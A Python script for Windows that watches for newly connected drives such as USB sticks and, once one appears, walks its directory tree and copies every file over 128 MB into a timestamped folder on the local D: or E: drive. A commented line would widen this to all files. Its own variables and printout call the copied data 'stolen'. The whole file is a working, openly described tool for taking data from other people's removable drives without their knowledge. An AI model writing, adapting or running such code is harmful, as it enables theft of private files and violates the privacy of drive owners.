import os
import shutil
import time
import threading
import win32api

current = []
roots = 'D:\\######'
rooting = ''
threads = []
info = [0, 0]
ignored = 0
stolen = 0
cur = [0, 0]
temp_thread = []
count = 0
tot_start = 0


def copyer(source, target):
    try:
        shutil.copy(source, target)
    except:
        pass


for root in range(ord('C'), ord('Z') + 1):
    try:
        os.listdir(chr(root) + ':\\')
        current.append(chr(root) + ':\\')
    except FileNotFoundError:
        pass
    except PermissionError:
        current.append(chr(root) + ':\\')

print(current)

try:
    os.mkdir('D:\\######')
except FileExistsError:
    pass
except PermissionError:
    try:
        roots = 'E:\\######'
        os.mkdir('E:\\######')
    except FileExistsError:
        pass


def dfs(source):
    global roots, stolen, ignored
    dirs = os.listdir(source)

    for element in dirs:
        try:
            temp = ''
            temp_list = os.path.join(source, element).split('\\')[1:]
            for i in temp_list[:-1]:
                temp = temp + i + '\\'
            temp = temp + temp_list[-1]
            if os.path.isdir(os.path.join(source, element)):
                info[1] += 1
                os.makedirs(os.path.join(rooting, temp))
                dfs(os.path.join(source, element))
            else:
                if os.path.getsize(os.path.join(source, element)) / 1048576 > 128:
                # if True:
                    info[0] += 1
                    stolen += os.path.getsize(os.path.join(source, element)) / 1048576
                    threads.append([threading.Thread(target=copyer,
                                                     args=(os.path.join(source, element), os.path.join(rooting, temp),)),
                                    os.path.getsize(os.path.join(source, element))])
                    # shutil.copy(os.path.join(source, element), os.path.join(rooting, temp))
                    # print(element, ":", os.path.getsize(os.path.join(source, element)) / 1024, 'KB')
                else:
                    ignored += os.path.getsize(os.path.join(source, element)) / 1048576
        except FileNotFoundError:
            pass
do_exit = False
count2 = 0

def controlt():
    global cnt, count2
    for i in range(len(threads)):
        try:
            cnt += 1
            count2 += threads[i][1]
            threads[i][0].start()
            threads[i][0].join()
        except RuntimeError:
            continue

while True:
    for root in [chr(x) + ':\\' for x in range(ord('C'), ord('Z') + 1)]:
        if root in current:
            continue
        try:

            os.listdir(root)
        except FileNotFoundError:

            continue
        except PermissionError:
            continue
        try:
            # time.sleep(45)
            os.listdir(root)
        except FileNotFoundError:

            continue
        except PermissionError:
            continue
        # time.sleep(45)
        disk_info = win32api.GetVolumeInformation("{}:\\".format(root[0]))
        print('{} was found.'.format(disk_info[0]))
        print('Scanning', end='')
        for i in range(3):
            print('.', end='')
            time.sleep(0.1)
        print()
        tot_start = time.perf_counter()
        threads = []
        ignored = 0
        stolen = 0
        t = "[" + str(time.time()) + "] from [" + disk_info[0] + "]"
        os.mkdir(os.path.join(roots, t))
        rooting = os.path.join(roots, t)
        dfs(root)
        print('{} files and {} directories in total'.format(info[0], info[1]))
        threads.sort(key=lambda x: x[1])
        cur = [0, info[0] - 1]
        count = info[0]
        group_num = 1
        cnt = 0
        start = time.perf_counter()
       
        threading.Thread(target=controlt).start()
        while cnt <= count:
            dur = time.perf_counter() - start
            a = "*" * int(cnt / count * 50)
            b = "." * int(50 - (cnt / count * 50))
            print("\r{:^3.0f}%[{}->{}]{:.2f}s,{} files and {} Mb remaining. ".format(cnt / count * 100, a, b, dur, count - cnt, stolen - count2 / 1048576), end="")
            if cnt == count:
                break

        print("\r100%[{}->]{:.2f}s,0 files and 0 Mb remaining.                                ".format(a, dur), end="")
        print('\nCompleted in {:.2f}s.'.format(time.perf_counter() - tot_start))
        print('stolen {:.2f} Mb, ignored {:.2f} Mb, total {:.2f} Mb'.format(stolen, ignored, stolen + ignored))
        do_exit = True
        break
    if do_exit:
        break
    time.sleep(1)
input('Press Enter to exit...')
